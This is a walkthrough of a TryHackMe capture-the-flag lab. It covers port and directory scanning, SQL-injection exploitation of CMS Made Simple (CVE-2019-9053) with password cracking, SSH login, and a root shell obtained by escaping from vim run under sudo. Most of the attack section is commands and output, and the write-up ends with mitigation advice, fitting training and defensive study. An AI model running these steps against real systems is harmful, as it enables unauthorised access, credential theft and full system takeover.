# Simple CTF – TryHackMe VAPT Walkthrough

**Prepared by:** Nishanth Antony  
**Date:** August 17, 2025  
**Difficulty:**  Easy  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** [TryHackMe](https://tryhackme.com)  

---

## 🔍 1. Reconnaissance

**Objective:** Identify open ports, running services, and potential entry points.

### Nmap Scan

```bash
nmap -p- --min-rate=1000 -sV <target_ip> -T4
```

**Result:**

```
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

➡️ **Observation:** FTP, HTTP, and SSH (non-standard port `2222`) are open.

---

## 🌐 2. Web Enumeration

### Directory Scan

```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
```

**Key Findings:**

```
/index.html  (200 OK)
/robots.txt  (200 OK)
/simple/     (301 Redirect → http://<target_ip>/simple/)
```

➡️ `/simple/` reveals a **CMS Made Simple 2.2.8** instance.

### Vulnerability Research

```bash
searchsploit -s "cms made simple 2.2"
```

**Finding:**

* **CVE-2019-9053** → SQL Injection vulnerability in versions `<2.2.10`.

---

## 💥 3. Exploitation

### Step 1 – SQL Injection Exploit

```bash
python3 46635-py3.py -u http://<target_ip>/simple/ --crack \
  -w /usr/share/wordlists/passwords/rockyou.txt
```

**Result:**

```
[+] Username: mitch
[+] Email: admin@admin.com
[+] Password cracked: secret
```

🔑 Credentials obtained:

* **User:** mitch
* **Password:** secret

---

### Step 2 – SSH Access

```bash
ssh mitch@<target_ip> -p 2222
```

**Proof:**

```bash
$ cat user.txt
G00d j0b, keep up!
```

---

## 🚀 4. Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

**Result:**

```
(root) NOPASSWD: /usr/bin/vim
```

### Root Shell via VIM

```bash
sudo vim -c ':!/bin/bash'
```

**Proof:**

```bash
# cat /root/root.txt
W3ll d0n3. You made it!
```

---

## 🛡️ 5. Mitigation Recommendations

* **Web Security:** Patch CMS Made Simple >2.2.10, sanitize all input, and restrict sensitive files (`robots.txt`).
* **Passwords:** Use strong, non-dictionary passwords and secure hashing (bcrypt/argon2).
* **System Hardening:** Remove dangerous `NOPASSWD` sudo rules (especially for editors like vim).
* **Monitoring:** Enable intrusion detection, monitor brute-force attempts, and audit privilege escalations.

---

## 📚 6. Lessons Learned

* Outdated CMS platforms pose critical risks.
* SQL injection can expose entire credential databases.
* Misconfigured `sudo` rules can quickly lead to root.
* Small oversights (e.g., weak hashing + bad sudo configs) compound into full compromise.

---

## 🎯 7. Skills Demonstrated

* Network & Web Enumeration → `nmap`, `gobuster`
* SQL Injection Exploitation → CVE-2019-9053, hash cracking (`john`)
* Post-Exploitation → SSH login, privilege escalation
* Secure Documentation → Structured reporting with PoC evidence

---
